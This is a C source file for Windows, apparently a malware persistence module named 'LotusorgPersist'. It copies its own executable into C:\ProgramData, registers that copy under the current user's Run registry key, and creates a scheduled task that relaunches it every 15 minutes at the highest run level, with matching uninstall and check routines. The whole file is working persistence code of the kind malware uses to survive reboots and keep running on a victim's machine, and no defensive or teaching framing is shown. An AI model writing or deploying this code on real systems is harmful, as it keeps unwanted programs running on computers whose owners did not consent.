#include <windows.h>
#include <stdio.h>

#define RUN_KEY_HKCU "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_VALUE_NAME "LotusorgPersist"
#define PERSISTENCE_PATH "C:\\ProgramData\\LotusorgPersist.exe"
#define TASK_NAME "LotusorgPersistTask"

void copy_self_to_persistence_path() {
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);
    CopyFileA(self_path, PERSISTENCE_PATH, FALSE);
}

void add_run_registry() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY_HKCU, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, RUN_VALUE_NAME, 0, REG_SZ, (const BYTE*)PERSISTENCE_PATH, (DWORD)(strlen(PERSISTENCE_PATH) + 1));
        RegCloseKey(hKey);
    }
}

void remove_run_registry() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY_HKCU, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, RUN_VALUE_NAME);
        RegCloseKey(hKey);
    }
}

void create_scheduled_task() {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "schtasks /Create /F /TN \"%s\" /TR \"%s\" /SC MINUTE /MO 15 /RL HIGHEST",
        TASK_NAME, PERSISTENCE_PATH);
    system(cmd);
}

void delete_scheduled_task() {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "schtasks /Delete /F /TN \"%s\"", TASK_NAME);
    system(cmd);
}

int is_persistent() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY_HKCU, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
        return 0;

    char val[MAX_PATH];
    DWORD size = sizeof(val);
    if (RegQueryValueExA(hKey, RUN_VALUE_NAME, NULL, NULL, (LPBYTE)val, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    DWORD attr = GetFileAttributesA(val);
    if (attr == INVALID_FILE_ATTRIBUTES)
        return 0;

    return 1;
}
void install_persistence() {
    copy_self_to_persistence_path();
    add_run_registry();
    create_scheduled_task();
}
void uninstall_persistence() {
    remove_run_registry();
    delete_scheduled_task();
    DeleteFileA(PERSISTENCE_PATH);
}

int main(int argc, char* argv[]) {
    if (argc < 2)
        return 0;

    if (strcmp(argv[1], "--install") == 0) {
        install_persistence();
    } else if (strcmp(argv[1], "--uninstall") == 0) {
        uninstall_persistence();
    }

    return 0;
}
